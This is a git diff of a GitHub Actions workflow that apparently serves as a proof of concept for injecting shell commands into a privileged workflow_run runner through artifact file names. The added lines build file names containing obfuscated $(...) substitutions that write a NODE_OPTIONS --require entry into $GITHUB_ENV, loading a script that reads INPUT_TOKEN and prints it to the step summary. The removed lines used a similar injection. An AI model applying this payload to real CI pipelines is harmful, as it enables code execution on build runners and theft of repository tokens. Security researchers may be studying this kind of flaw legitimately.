@@ -16,8 +16,9 @@ jobs:
         run: |
           mkdir -p content
           cd content
-          printf 'RCE_PROOF: injected shell payload executed on the privileged workflow_run runner\n' > summary.txt
-          printf '' > rce.txt
+          printf 'RCE_PROOF: normal artifact content\n' > summary.txt
+          printf 'NODE_OPTIONS=--require=/tmp/content/content/p.js\n' > env.txt
+          printf 'DECOY\n' > x.txt
           cat > p.js <<'JS'
           const fs = require('fs');
           const t = process.env.INPUT_TOKEN || '';
@@ -25,9 +26,9 @@ jobs:
           try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/s', s + '\n'); } catch (e) {}
           console.log(s);
           JS
-          touch 'a$(id>>$GITHUB_STEP_SUMMARY).txt'
-          W='${GITHUB_WORKSPACE:0:1}'
-          touch "x\$(printf\${IFS}NODE_OPTIONS=--require=$W""tmp$W""content$W""content$W""p.js\\n>>\$GITHUB_ENV).txt"
+          touch 'x$(id).txt'
+          W='${PWD:0:1}'
+          touch "x\$(cp\${IFS}$W""tmp$W""content$W""content$W""env.txt\${IFS}\$GITHUB_ENV).txt"
           ls -la
       - name: Upload artifact
         uses: actions/upload-artifact@v4
